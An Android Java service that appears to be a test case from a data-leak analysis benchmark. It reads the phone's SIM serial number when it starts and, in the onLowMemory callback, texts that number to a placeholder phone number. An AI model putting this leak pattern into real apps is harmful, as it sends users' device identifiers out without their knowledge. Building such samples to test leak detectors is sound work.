package de.ecspride;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MainService extends Service {
	private String secret = null;
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		secret = telephonyManager.getSimSerialNumber();
		return 0;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO for communication return IBinder implementation
		return null;
	}
	
	@Override
	public void onLowMemory(){
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, secret, null, null);   
  	}

}
